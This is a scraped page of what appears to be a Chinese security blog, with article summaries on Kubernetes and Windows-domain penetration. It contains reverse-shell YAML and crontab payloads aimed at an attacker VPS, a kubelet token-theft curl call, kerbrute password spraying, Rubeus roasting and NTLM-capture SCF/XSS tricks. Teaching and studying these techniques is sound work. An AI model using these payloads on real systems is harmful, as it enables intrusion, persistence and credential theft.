所以利用方式和apiserver未授权类似，这里不再细说
kubelet未授权 kubelet和kubectl的区别？
kubelet是在Node上用于管理本机Pod的，kubectl是用于管理集群的。kubectl向集群下达指令，Node上的kubelet收到指令后以此来管理本机Pod
每个节点都有一个kubelet服务，kubelet是在每个节点上运行的主要节点代理，监听了10250、10248、10255等端口，负责管理节点上的容器与master节点的通信，而10250端口就是kubelet与API Server进行通信的主要端口
如果kubeconfig文件中的配置不当，则会导致系统存在kubelet未授权访问，在该情况下，攻击者能够列出当前运行的pod，对任意pod执行命令等，实现进一步的利用
例如对服务账号绑定了cluster-admin权限的pod执行命令来读取服务账号的token，然后利用高权限token控制apiserver，创建恶意pod并逃逸
通过请求接口执行命令读取token：
curl -XPOST -k &amp;amp;#34;https://${K8S}:10250/run/&amp;amp;lt;namespace&amp;amp;gt;/&amp;amp;lt;pod&amp;amp;gt;/&amp;amp;lt;container&amp;amp;gt;&amp;amp;#34; -d &amp;amp;#34;cmd=cat /var/run/secret/kubernetes.io/serviceaccount/token&amp;amp;#34; etcd未授权 k8s使用etcd存储数据，默认监听2379端口，如果该端口暴露到公网且存在未授权访问，就可能导致信息泄漏，攻击者可以通过收集到的凭证来尝试接管集群，而由于本机可免认证访问2379端口，所以可以结合SSRF来打组合拳
">K8s渗透-初始访问</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%89%A7%E8%A1%8C/" class="article-link" data-summary="K8s渗透-执行 文章首发于track安全社区：K8s渗透入门从零到一
执行阶段的主要任务是实现在集群内执行任意命令，获得shell
kubectl exec进入容器 当我们能够控制apiserver时，和docker类似，我们可以使用命令进入容器的shell中执行命令：
# apiserver未授权时 kubectl -s x.x.x.x:8080 --namespace=default exec -it test-rev -- bash # 获取到kubeconfig文件时 kubectl --kubeconfig config --namespace=default exec -it test-rev -- bash # 获取到高权限token时 kubectl --server=https://x.x.x.x:6443 --token=&amp;amp;#34;&amp;amp;lt;token值&amp;amp;gt;&amp;amp;#34; --insecure-skip-tls-verify --namespace=default exec -it test-rev -- bash 比如这里进入容器执行反弹shell命令
成功监听到反弹shell：
创建后门pod 获取初始访问权限后，通过创建后门pod来执行后续攻击，
首先本机上新建个yaml文件用于创建容器，将节点的根目录挂载到容器的 /mnt 目录，并在容器启动后自动执行反弹shell命令，内容如下：
apiVersion: v1 kind: Pod metadata: name: test-rev spec: nodeName: &amp;amp;lt;节点名称&amp;amp;gt; containers: - name: test-container image: ubuntu command: [&amp;amp;#34;/bin/sh&amp;amp;#34;] args: - &amp;amp;#34;-c&amp;amp;#34; - | apt update &amp;amp;amp;&amp;amp;amp; apt install -y bash netcat-openbsd &amp;amp;amp;&amp;amp;amp; \ bash -c &amp;amp;#39;while true; do bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/&amp;amp;lt;你的vps的公网IP&amp;amp;gt;/2333 0&amp;amp;gt;&amp;amp;amp;1; sleep 60; done&amp;amp;#39; volumeMounts: - mountPath: /mnt name: test-volume securityContext: privileged: true volumes: - name: test-volume hostPath: path: / 然后使用 kubectl 创建文件指定的恶意容器：
">K8s渗透-执行</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%8C%81%E4%B9%85%E5%8C%96/" class="article-link" data-summary="K8s渗透-持久化 文章首发于track安全社区：K8s渗透入门从零到一
持久化即权限维持，通过持久化在k8s中留下后门，可以在初始访问的入口点丢掉之后仍然保持对k8s的控制权
部署后门容器 在拥有了创建pod的权限后，我们就可以创建一个恶意的pod为我们实现权限维持（即在容器中留下shell），并且在pod中留下能控制node的后门（比如挂载node的根目录）
常见方法如下
挂载目录 向创建的pod中挂载一些用于逃逸的目录，在我的逃逸相关文章详细记录了：K8s渗透-权限提升
这里值得一提的是，我们可以使用这个配置：
restartPolicy: Always 可以让pod在被关闭后重启
使用k8s控制器部署后门容器 在前面 K8s渗透-执行 的文章中，我们部署后门容器的方式是使用yaml文件，而文件中有这样一行：
kind: Pod 这代表我们创建的后门容器就是一个单纯的pod，而除此之外还有一类后门是控制器，它能自动创建和控制恶意pod，并且它也基于yaml文件创建，优点是更稳定，其自动创建的pod在被kill后可以被恢复，它的yaml文件格式如下：
apiVersion: apps/v1 kind: Deployment metadata: name: test-rev spec: replicas: 1 selector: matchLabels: app: test-rev template: metadata: labels: app: test-rev spec: nodeName: &amp;amp;lt;节点名称&amp;amp;gt; containers: - name: test-container image: ubuntu command: [&amp;amp;#34;/bin/sh&amp;amp;#34;] args: - &amp;amp;#34;-c&amp;amp;#34; - | apt update &amp;amp;amp;&amp;amp;amp; apt install -y bash netcat-openbsd &amp;amp;amp;&amp;amp;amp; \ bash -c &amp;amp;#39;while true; do bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/&amp;amp;lt;你的vps的公网IP&amp;amp;gt;/2333 0&amp;amp;gt;&amp;amp;amp;1; sleep 60; done&amp;amp;#39; volumeMounts: - mountPath: /mnt name: test-volume securityContext: privileged: true volumes: - name: test-volume hostPath: path: / 指定yaml文件即可创建：
">K8s渗透-持久化</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="article-link" data-summary="K8s渗透-权限提升 文章首发于track安全社区：K8s渗透入门从零到一
一般来说，在k8s中的提权就是尝试从pod容器获取到对node节点的控制权，甚至获取对云资源的访问权限。
RBAC权限滥用 类似于我们在执行中提到的打法，就是获取pod中高权限（比如绑定到cluster-admin用户组）的serviceaccount，然后再调用apiserver实现逃逸，然而除了cluster-admin，很多凭证也是可以权限提升到cluster-admin的，我们可以重点关注Helm、Cilium、Nginx Ingress、Prometheus等服务
部署静态pod 这个方法在我的k8s渗透-持久化的笔记中已经介绍过了，这里不再赘述
利用容器不安全配置提权 即容器逃逸，这里的很多tricks其实和docker逃逸没有很大区别
挂载目录逃逸 挂载的方法很多，例如挂载根目录、挂载pocfs、挂载/etc、挂载cgroup、挂载/var/log等等，可以直接看我的这篇文章：Docker逃逸手法大全，这里提一个最简单的挂载根目录：
比如我们创建恶意pod的时候，根目录挂载到了容器的/mnt目录，所以在获取了pod的shell后，我们可以通过查看pod的/mnt目录来访问查看node的根目录：
接下来可以通过写定时任务来获取node的shell：
echo -e &amp;amp;#34;* * * * * root /bin/bash -c &amp;amp;#39;sh -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/&amp;amp;lt;vps的公网IP&amp;amp;gt;/4444 0&amp;amp;gt;&amp;amp;amp;1 &amp;amp;amp; disown &amp;amp;#39;&amp;amp;#34; &amp;amp;gt;&amp;amp;gt; /mnt/etc/crontab 注意，这里并没有直接使用sh -i &amp;amp;gt; /dev/tcp/&amp;amp;lt;IP&amp;amp;gt;/4444 2&amp;amp;gt;&amp;amp;amp;1，因为cron 默认使用的是 /bin/sh，而不是 bash，sh 不支持&amp;amp;gt;&amp;amp;amp;语法，上面的yaml文件中反弹shell的payload同理
我在k3s环境遇到一个问题，在收到反弹shell后会立刻自动exit或者退出：
这里其实可以偷懒直接chroot一下也行，但是这样只能以高权限进行文件相关操作： 不过通过查阅资料发现原因可能和busybox的情况类似，对-i即交互参数支持不完整，那么我们可以尝试使用disown命令让我们反弹shell的进程不受父shell进程影响而exit：
echo -e &amp;amp;#34;* * * * * root /bin/bash -c &amp;amp;#39;bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/&amp;amp;lt;IP&amp;amp;gt;/4444 0&amp;amp;gt;&amp;amp;amp;1 &amp;amp;amp; disown&amp;amp;#39;&amp;amp;#34; &amp;amp;gt;&amp;amp;gt; /mnt/etc/crontab 此时我们就可以接收到反弹的shell并且不会断开了： 持久化挂载docker.sock 挂载docker socket逃逸同样在我写的 Docker逃逸手法大全 中详细介绍了，值得一提的是，如果已经获取了此类容器的 full tty shell, 可以用类似下述的命令创建一个通往宿主机的 shell：
">K8s渗透-权限提升</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="article-link" data-summary="k8s渗透-横向移动 窃取凭证 kubeconfig凭证 kubeconfig文件通常出现在运维PC、内网跳板机、堡垒机、master节点等机器上，kubeconfig文件的使用在我的 k8s渗透-初始访问 笔记中已经介绍了，这里不再说明
secret对象 在k8s中，secret对象用于存储密码、OAuth令牌、ssh密钥等敏感信息，我们可以尝试从中窃取其他服务的通信凭证：
kubeconfig get secrets -A 查看指定secret内容：
kubectl --kubeconfig config -n [指定命名空间] get secret [secret名称] -o yaml 可惜这里案例上是hash，如果是硬编码在secret中，就可以解码获取明文密码了
集群内网渗透 K8s默认允许集群内部的pod和service直接通信，在没有NetworkPolicy / eBPF限制的情况下，无论是node还是pod，内网的通信和常规内网渗透的情况基本无差异，我们仍然可以使用nmap、masscan、fscan等扫描工具进行内网探索，也可以使用常规内网的横向移动手段
第三方组件风险 在很多k8s的配置教程中会存在一些忽略真实环境安全问题的情况，导致一些插件/服务存在未授权的情况，甚至是服务账号具有高权限，基于这些情况，我们可以关注一些常见的服务账号比如helm、cilium、Nginx Ingress、Prometheus，比如helm v2版本默认存在高权限账号，那么可以利用高权限给自己赋予cluster-admin进而提权逃逸
简而言之，我们的思路可以是：进入pod，通过漏洞/未授权攻击第三方组件，利用组件的不当权限操作k8s集群
污点（taint）横向 这个方法较为鸡肋，原因是k8s污点横向需要配合一些漏洞，而这些配合漏洞往往可以单独拿到权限
污点是k8s高级调度的特性，用于限制哪些pod能被调度到某一节点上
其中污点有三种属性(效果)：
NoSchedule：这是最常见的类型，表示不允许 Pod 被自动调度到带有此污点的节点上。只有当 Pod 具有与污点匹配的容忍度时，才能在这些节点上调度 Pod。 PreferNoSchedule：这种类型表示不推荐但允许 Pod 被调度到带有此污点的节点上。即使节点上设置了 PreferNoSchedule 污点，如果没有其他更适合的节点，Pod 仍然可以被调度到这些节点上。 NoExecute：这种类型表示节点上的Pod会被驱逐（Eviction），即使它们已经运行在该节点上。通常，NoExecute 污点会导致 Pod 被终止并迁移到其他节点。 一般来说master节点包含一个污点，而这个污点通常用于阻止pod调度到主节点上，除非pod能容忍该污点（通常容忍这个污点的pod都是系统级，别比如kube-system命名空间下的pod），在普通节点横向时，我们可以使用污点容忍度创建恶意pod尝试横向到主节点
比如：获取worker节点权限，创建配置了与master节点污点对应容忍度的恶意node，yaml如下：
cat &amp;amp;gt; x.yaml &amp;amp;lt;&amp;amp;lt; EOF apiVersion: v1 kind: Pod metadata: name: control-master-x spec: tolerations: - key: &amp;amp;#34;node-role.kubernetes.io/master&amp;amp;#34; operator: &amp;amp;#34;Exists&amp;amp;#34; effect: &amp;amp;#34;NoSchedule&amp;amp;#34; containers: - name: control-master-x image: ubuntu:18.04 command: [&amp;amp;#34;/bin/sleep&amp;amp;#34;, &amp;amp;#34;3650d&amp;amp;#34;] volumeMounts: - name: master mountPath: /master volumes: - name: master hostPath: path: / type: Directory EOF 这样create的pod允许被调度到主节点，这里多次尝试创建就有机会创建到master节点，进而逃逸接管master节点
">k8s渗透-横向移动</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>内网渗透</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/msfcs%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="article-link" data-summary="MSF&amp;amp;amp;CS介绍与使用 免责声明：本文所有内容仅供学习交流，请勿用于违法活动
Metasploit Framework（MSF） Metasploit是ruby语言开发的一个基于命令行操作的渗透测试框架，我们可以查找，利用和验证漏洞，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程
一、msf体系框架 msf的整体框架如下：
我们重点关注模块部分
模块组织按照不同的用途分为7种类型的模块（Modules）：
辅助模块（Aux)：负责信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能 渗透攻击模块（Exploits)：利用系统漏洞进行攻击，里面有每一个具体漏洞的攻击方法 后渗透攻击模块（Post)：在取得目标系统远程控制权限后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作 攻击载荷模块（payloads)：成功exploit之后，真正在目标系统执行的代码或指令 编码器模块（Encoders)：主要对payload进行加密，最终达到躲避AntiVirus检查的目的 空指令模块（Nops)：主要作用是提高payload稳定性及维持大小 免杀模块(Evasion)：可以用来创建木马文件 二、Metasploit基本使用 kali中自带了msf，可以直接使用
Metasploit启动 msf有一个用于存储信息收集数据的关系型数据库Postgresql，可以自主选择是否开启
msf有三种启动方式：
先启动Postgresql数据库，再启动Metasploit
service postgresql start msfconsole 不启动数据库，直接启动Metasploit
msfconsole 启动Postgresql的同时启动Metasploit
msfdb run 也可以直接在kali左上角工具点击启动，实际上是自动执行了命令：
sudo msfdb init &amp;amp;amp;&amp;amp;amp; msfconsole 由于Postgresql数据库的默认端口为5432，所以可以查看该端口来判断是否开启Postgresql数据库：
netstat -pantu | grep 5432 Metasploit常用命令 在msfconsole中，输入help可以看见各种命令的介绍
show展示 用于展示可用模块，有效参数是：all，encoders，nops，exploits，payloads，auxiliary, post，plugins，info，options
展示模块时，每个模块都会有一个名为Rank的字段，该列代表该模块的可靠性
Rank 的值可以是下面的表格中的其中之一，按照可靠性降序排列
Ranking Description ExcellentRanking 漏洞利用程序绝对不会使目标服务崩溃，就像 SQL 注入，命令执行，远程文件包含，本地文件包含等等。除非有特殊情况，典型的内存破坏利用程序不可以被评估为该级别。（WMF Escape()） GreatRanking 该漏洞利用程序有一个默认的目标系统，并且可以自动检测适当的目标系统，或者在目标服务的版本检查之后可以返回到一个特定于应用的返回地址。（译者注：有些二进制的漏洞利用成功后，需要特别设置 Shell 退出后的返回地址，否则当 Shell 结束后，目标服务器会崩溃掉。） GoodRanking 该漏洞利用程序有一个默认目标系统，并且是这种类型软件的“常见情况”（英文，桌面应用程序的Windows 7，服务器的2012等常用） NormalRanking 该漏洞利用程序是可靠的，但是依赖于特定的版本，并且不能或者不能可靠地自动检测。 AverageRanking 该漏洞利用程序不可靠或者难以利用。 LowRanking 对于通用的平台而言，该漏洞利用程序几乎不能利用（或者低于 50% 的利用成功率） ManualRanking 该漏洞利用程序不稳定或者难以利用并且基于拒绝服务（DOS）。如果一个模块只有在用户特别配置该模块的时候才会被用到，否则该模块不会被使用到，那么也可以评为该等级。（例如：exploit/unix/webapp/php_eval） search搜索 已知一个漏洞，我想知道Metasploit里面是否有相关的模块，就可以用search进行搜索
">MSF&amp;CS介绍与使用</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="内网渗透-AD域基础知识 简介 内网也指局域网，是一个封闭的网络空间
内网渗透（intranet exploitation）是对目标服务器getshell后，通过一系列技术手段对其所处的内网环境进行渗透，最终获取内网其他主机的权限的过程，这些通常涉及以下技术：
内网信息收集 内网代理 权限提升 横向移动 &amp;amp;hellip;&amp;amp;hellip; 基本概念 工作组（work group） 分辨：在命令提示符界面执行systeminfo，回显结果的“域”信息为WORKGROUP
简单来说，就是将不同的计算机按照功能或部门分别置于不同的组，适用于网络中计算机不多、资产规模较小、对安全管理控制要求不严格的情况，这是一种松散的资源管理模式，任何人都可以在局域网中创建新的工作任务而无需管理员同意，换言之，处于同一工作组中的主机彼此间地位平等，不存在额外关联或管理关系，对于此类情况，在内网渗透时需要逐个渗透与控制
在局域网内，计算机默认都是按照工作组的方式进行资源管理的
优点： 方便管理和维护 资源分配方便和灵活 缺点： 缺乏集中管理与控制的机制 没有集中的统一账户管理 只适合小规模用户的使用 域（domain） 分辨：在命令提示符界面执行systeminfo，回显结果的“域”信息为类似域名格式，由“.”连接的字符串
当组织中网络规模越来越大时，需要统一的管理和集中的身份验证，并能为用户提供更加方便地的网络资源搜索和使用方式时，就需要放弃工作组而使用域
域是一种比工作组更高级的的计算机资源管理模式，在域环境中，所有用户账户、用户组、计算机、打印机和其他安全主体都在一个或多个域控制器的中央数据库中注册；当域用户想访问域中的资源时，必须通过域控制器集中进行身份验证，通过身份验证的域用户在域中的身份决定了域用户对域中资源的访问权限
在域环境中，域管理员用户在域中具有最高访问权限和最高管理权限，在渗透过程中，获取域管理员相关权限往往可以控制整个域控
单域
指网络环境中只有一个域
父域和子域
某些情况下，需要在一个域中分出多个域，被划分的域称为父域，划分出来的域被称为子域，每个子域都拥有自己的安全策略，在有信任的情况下，父域可以访问子域
从域名上看，子域是域名中的一个段，用“.”进行域名分割，一个“.”代表域名的一个层级
域树
域树是多个域通过建立信任关系组成的一个域集合
在域树中，所有的域共享同一表结构和配置，所有域名形成一个连续的名字空间，该命名空间具有连续性，域名层次越深，级别越低
在域树中，域管理员只能管理本域，不能访问或管理其他域，如果两个域之间要互相访问，就需要建立信任关系（trust relation）
域林
指由一个或多个没有形成连续名字空间的域树通过建立信任关系组成的域树集合，域林中所有域树共享同一个表结构、配置和全局目录
域控制器 域控制器（Domain Controller，DC）简称域控，是域环境核心的服务器计算机，用于在域中响应安全身份认证请求，负责允许或拒绝发出请求的主机访问域内资源，以及对用户进行身份验证、存储用户账户信息并执行域的安全策略等，域控包含一个活动目录数据库，其中存储着整个域的账户、密码、计算机等信息，而前面提到的身份验证便主要有以下步骤：
该计算机是否属于本域 登录账号是否存在 密码是否正确 一个域环境可以拥有一台或多台域控制器，每台域控都各自存储了一份所在域的活动目录AD的可写副本，对AD的修改都可以从源域控同步复制到域、域树或域林的其他控制器上，这样即使其中一台域控瘫痪，另一台域控也可以继续工作，保证域环境正常运行
一般情况下，DC也会被作为DNS服务器使用
域环境搭建 主机准备 我准备了三台主机
windows server 2019 datacenter windows 10 pro x64 windows 10 pro x64 配置域控 配置静态IP 打开控制面板中的网络设置，将IP配置为静态的192.168.111.100：
">内网渗透基础知识</a>
        
      </div>
    </li>
  
  
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>windows协议</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/kerberos%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/" class="article-link" data-summary="kerberos攻击专题 由于kerberos协议认证的基础流程前面文章已经详细解释了，这里就直接进入攻击阶段
总的来看kerberos可以归结于两个字：票据，前面提到了各阶段的安全问题：
AS-REQ阶段 域内用户名枚举 AS-REQ中的cname表示请求的用户名，用户名是否存在会影响返回包的内容，因此可以进行域内用户名枚举
方法 可以使用kerbrute进行枚举： 使用编译好的工具，我们能够在一台不在域内（即域外）的机器上和DC进行通信的机器上枚举域内用户：
kerbrute_windows_amd64.exe userenum --dc 192.168.111.100 -d yuy0ung.com user.txt 当然还有python脚本https://github.com/3gstudent/pyKerbrute
msf上也有kerberos_enumusers模块
检测与防御 流量：检测同一IP短时间内是否发送了大量的AS-REQ包 日志：默认情况下，对于不存在的用户名发起的AS-REQ包不会有任何记录（记录需要更改组策略），所以日志层面不好检测 密码喷洒 而用户名存在时，密码的正确与否也会影响返回包，这里虽然可以进行密码爆破，但连续针对同一账户的密码猜测很有可能会导致账户被锁定，因此有了密码喷洒喷洒攻击：即在猜解密码时，使用每个密码去尝试所有用户名
方法 该攻击同样可以在域外进行，但并不支持kerberos
可以使用kerbrute进行喷洒：
kerbrute_windows_amd64.exe passwordspray --dc 192.168.111.100 -d yuy0ung.com user.txt Admin123456 当然，如果域没有密码锁定策略，可以直接对单个用户进行爆破：
kerbrute_windows_amd64.exe bruteuser --dc 192.168.111.100 -d yuy0ung.com user.txt pass.txt 检测与防御 流量：检测同一IP短时间内是否发送了大量的AS-REQ包 日志：登录成功会产生日志4768，且结果代码为0x0，登录失败日志不做记录 AS-REP阶段 AS-REP Roasting 对于域用户，如果设置了选项”不要求kerberos域身份验证”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP请求enc-part的cipher进行组合解密就能获得用户的明文。（enc-part底下的cipher，这部分是使用用户hash加密session-key)
方法 获取Hash
可以使用Rbeus自动搜索满足条件的用户，并获取login session key：
Rubeus.exe asreproast /format:john /outfile:hash.txt 再使用john进行离线破解即可：
john --wordlist=/opt/pass.txt hash.txt 检测与防御 检测域中是否设置了“不要求kerberos域身份验证”，如果存在及时关闭 日志：重点关注事件ID为4768且预身份验证类型为“不要求kerberos域身份验证”属性用户发起的Kerberos认证 黄金票据攻击 在AS-REP阶段，返回的TGT的加密部分是由krbtgt用户的密钥加密的，因此，如果我们获得了krbtgt的密钥，我们就可以自己制作一个TGT，该票据被称为黄金票据
">kerberos攻击专题</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/ntlm-relay%E4%B8%93%E9%A2%98/" class="article-link" data-summary="NTLM Relay专题 NTLM协议和NTLM Relay的相关概念已经在之前的文章中介绍过了， 这里直接从相关攻击方法以及步骤开始
发起并截获NTLM请求 消息传输依赖使用NTLM认证的上层协议，比如SMP、LDAP、HTTP、MSSQL，只要是使用这些上层协议的应用程序都可以发起NTLM请求，而我们可以使用responder拦截NTLM认证请求获取net-HTLM hash：
responder：Releases · SpiderLabs/Responder
常用方法 通常通过设置指向恶意服务器的UNC路径，使目标主机自动向恶意服务器发起HTLM认证，方法如下：
系统命令 使用能传入UNC路径的命令，比如：
dir \\192.168.111.130\share net use \\192.168.111.130\share 这样的命令还有很多，当我们发起认证responder即可成功截取net-NTLM hash v2：
desktop.ini windows系统下有个隐藏文件desktop.ini，用于指定和存储文件夹图标之类的个性化设置，这里面的iconresource是文件夹的图标路径，可以改为指向恶意服务器的UNC，那么当主机请求图标资源时，即可截获htlm hash：
例如我将music文件夹的desktop.ini更改：
只要显示时请求图标即可截获htlm hash：
SCF文件 这是文件资源管理器命令文件，也是一个可执行文件，文件中的IconFile属性可以指定UNC路径，文件资源管理器会加载这个属性指定的文件图标，那么和上面同理：
在任意文件夹下创建test.scf文件：
[shell] Command=2 IconFile=\\192.168.111.130\share\test.ico [Taskbar] Command=ToggleDesktop 用户访问该文件夹就会自动请求服务器，导致htlm hash被截获：
文档类文件 PDF规范允许GoTobe和GoToR条目加载远程内容，测试人员可以在PDF中插入UNC路径，如果用户使用adobe reader打开pdf，则会发起HTLM请求
可以使用github上的badpdf进行生成恶意的PDF，这里不做赘述
该方法局限性很高，必须使用adobe reader才会触发NTLM认证
当然office也有类似的方法，可以学习一下
打印机 Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。
任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。
通过脚本PetitPotem可以让目标机器强制回连
但是由于机器版本问题，使用printerbug很可能出问题(函数调用问题)，可以使用Coercer进行函数fuzz测试，比较好用
web层面的利用 XSS 使用src标签请求恶意服务器发起NTLM认证
如果用UNC路径：
&amp;amp;lt;script src=&amp;amp;#34;\\192.168.111.130\xss&amp;amp;#34;&amp;amp;gt; 这种情况适用于IE和edge，能够直接截获ntlm hash
如果通过http：
&amp;amp;lt;script src=&amp;amp;#34;//192.168.30.130/xss&amp;amp;#34;&amp;amp;gt; 这样的标签访问页面会弹出认证框，需要用户登录后才能截获htlm hash
文件包含 同理了，文件包含函数支持解析UNC路径
当然，XXE、SSRF都可以尝试这样利用
">NTLM Relay专题</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/windows%E5%8D%8F%E8%AE%AE%E4%B9%8Bkerberos/" class="article-link" data-summary="Windows协议之Kerberos Kerberos协议一种网络身份验证协议，是一种在开放的非安全网络中认证并识别用户身份信息的方法，旨在使用密钥加密技术为客户端/服务端提供应用程序提供强身份验证
Kerberos本来是西方神话中守卫地狱之门的三头犬的名字，之所以使用这个名字，是因为该协议需要三方共同参与才能完成一次认证。
目前主流使用的Kerberos版本为2005年RFC4120**(https://www.rfc-editor.org/rfc/rfc4120.html)**标准定义的KerberosV5版本，Windows、Linux和Mac OS均支持Kerberos协议
一、Kerberos基础 在Kerberos协议中，主要有以下三个角色：
访问服务的客户端：Kerberos客户端代表需要访问资源的用户进行操作的应用程序，例如打开文件、查询数据库或打印文档。每个Kerberos客户端在访问资源之前都会请求身份验证
提供服务的服务端：域内提供服务的服务端，服务端都有唯一的SPN（服务主体名称）
提供认证服务的KDC（Key Distribution Center，密钥分发中心）：KDC是一种网络服务，它向活动目录域内的用户和计算机提供会话票据和临时会话密钥，其服务账户为krbtgt。KDC作为活动目录域服务的一部分运行在每个域控上
这里的krbtgt账户是在创建活动目录时系统自动创建的一个账户，其作用是在KDC的服务账户，其密码是系统随机生成的，无法正常登陆主机
而KDC包含AS（Authentication Server，认证服务器）和TGS（Ticket Granting Server，票据授权服务器）
Kerberos是一种基于票据（Ticket）的认证方式。客户端想要访问服务端的某个服务，首先需要购买服务端认可的ST（Service Ticket，服务票据）。通俗点说，就是客户端在访问服务前需要先买票，等待服务端验票之后才允许访问。而该票据不能直接购买，还需要一张TGT（Tiket Granting Tiket，认购权证）。也就是说客户端在买票前还需要获得一张TGT。而ST和TGT均由KDC发放，因为KDC运行在域控上，所以TGT和ST也均由域控发放
Kerberos协议使用TCP/UDP 88 端口进行认证，使用TCP/UDP 464 端口进行密码重设
Kerberos协议有两个基础认证模块：AS_REQ&amp;amp;amp;AS_REP 和 TGS_REQ&amp;amp;amp;TGS_REP，以及微软扩展的两个认证模块S4U和PAC。S4U是微软为了实现委派而扩展的模块，分为S4u2Self和S4u2Proxy。在Kerberos最初设计的流程里只说明了如何证明客户端的真实身份，并没有说明客户端是否有权限访问该服务，因为在域中不同权限的用户能够访问的资源是不同的。微软为了解决该问题，引入了PAC（Privilige Attribute Certificate，特权属性证书）的概念
二、PAC PAC包含各种授权信息、附加凭据信息、配置文件和策略信息等，例如用户所属的用户组、用户所具有的权限等。上文提到过，在最初的RFC1510规定的标准Kerberos认证过程中并没有PAC，微软在自己的产品实现的Kerberos流程中加入了PAC的概念
在一个正常的kerberos认证流程中，KDC返回的TGT的ST都带有PAC，这样的好处是在以后对资源的访问中，服务端接收到客户请求的时候不再需要借助KDC提供完整的授权信息来完成对用户权限的判断，而只需要根据请求中所包含的PAC信息直接与本地资源的ACL相比较来做出裁决
1.PAC结构 PAC的顶部结构是这样的：
typedef unsigned long ULONG; typedef unsigned short USHORT; typedef unsigned long64 ULONG64; typedef unsigned char UCHAR; typedef struct _PACTYPE { ULONG cBuffers; ULONG Version; PAC_INFO_BUFFER Buffers[1]; } PACTYPE; 各字段含义:
cBuffers：包含数组缓冲区中的条目数 Version：版本 Buffers：包含一个PAC_INFO_BUFFER结构的数组 而PAC_INFO_BUFFER结构包含关于每个部分的信息，非常重要：
">Windows协议之Kerberos</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/windows%E5%8D%8F%E8%AE%AE%E4%B9%8Bntlm/" class="article-link" data-summary="Windows协议之NTLM NTLM协议（New Technology LAN Manager）协议是微软用于Windows身份验证的主要协议之一
早期SMB协议以明文口令的形式在网络上传递，存在安全性问题，进而出现了LM（LAN manager）协议，然而该协议因为太简单，还是容易被破解，微软进而提出了NTLM协议
NTLM协议既可用于工作组环境中的机器身份验证，又可用于域环境身份验证，还可以为 SMB、HTTP、LDAP、SMTP 等上层微软应用提供身份验证
